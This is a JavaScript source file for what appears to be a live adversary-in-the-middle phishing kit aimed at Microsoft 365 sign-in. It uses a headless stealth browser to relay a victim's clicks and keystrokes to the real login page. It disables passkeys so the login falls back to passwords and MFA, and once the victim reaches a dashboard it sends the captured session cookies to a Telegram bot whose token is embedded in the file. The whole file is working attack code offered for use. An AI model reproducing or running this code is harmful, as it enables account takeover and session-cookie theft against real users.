const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

/**
 * Sends the full cookie jar as a .json file to Telegram.
 * This bypasses character limits and prevents 400 Bad Request errors.
 */
async function sendExfiltrationAlert(cookies, finalUrl) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        // 1. Notify that a capture happened
        await axios.post(msgUrl, {
            chat_id: CHAT_ID,
            text: `✅ *SESSION CAPTURED*\n*URL:* ${finalUrl}\n*Cookies:* ${cookies.length}\n_Sending file..._`,
            parse_mode: 'Markdown'
        });

        // 2. Prepare JSON file
        const cookieData = JSON.stringify(cookies, null, 2);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', Buffer.from(cookieData, 'utf-8'), {
            filename: 'cookies.json',
            contentType: 'application/json'
        });

        // 3. Send file via Multipart Upload
        await axios.post(docUrl, form, {
            headers: form.getHeaders()
        });

        console.log("[TELEGRAM] Full cookie jar exfiltrated successfully.");
    } catch (e) {
        console.error('[EXFIL-ERR]', e.response?.data || e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-dev-shm-usage', 
                '--single-process', // Necessary for Railway RAM stability
                '--no-zygote',
                '--disable-gpu'
            ]
        });

        const page = await browser.newPage();

        /**
         * 2026 NUCLEAR PASSKEY KILL-SWITCH
         * Forces Microsoft to fall back to standard MFA/Password by deleting 
         * modern auth APIs from the browser context before the page loads.
         */
        await page.evaluateOnNewDocument(() => {
            // Delete the API so Microsoft thinks this browser is from 2018
            delete window.PublicKeyCredential;
            
            if (navigator.credentials) {
                const originalGet = navigator.credentials.get;
                navigator.credentials.get = function(opt) {
                    if (opt && opt.publicKey) {
                        // Throwing this error forces the 'Sign in another way' UI to appear
                        return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
                    }
                    return originalGet.call(this, opt);
                };
            }
        });

        await page.setViewport({ width: 1280, height: 720 });
        
        // Firefox UA to dodge Chrome's aggressive hardware enforcement
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        // Navigation
        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
        
        const heartbeat = setInterval(emitFrame, 1500);

        // AUTO-CLICKER: Scans for 'Skip' or 'Cancel' to break Passkey UI loops
        const scanner = setInterval(async () => {
            try {
                const bypass = await page.$('#iShowSkip, #idBtn_Back, a[data-bind*="switchToPassword"]');
                if (bypass) {
                    console.log("[AUTO-BYPASS] Triggering fallback click.");
                    await bypass.click();
                }
            } catch (e) {}
        }, 3000);

        // Success Detection & Extraction
        page.on('framenavigated', async (frame) => {
            const url = frame.url();
            console.log(`[NAV-LOG] ${url}`);
            
            const dashboardUrls = ['office.com', 'shell/homepage', 'microsoft365.com', 'outlook', 'myapps'];
            if (dashboardUrls.some(key => url.includes(key))) {
                console.log("[SUCCESS] Reached Dashboard. Sending cookie file...");
                const cookies = await page.cookies();
                await sendExfiltrationAlert(cookies, url);
            }
        });

        // User Interaction
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        // Cleanup
        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(scanner);
            if (browser) await browser.close();
            console.log(`[CLEANUP] Browser closed for ${socket.id}`);
        });

    } catch (error) {
        console.error('[CRITICAL-ORCH]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
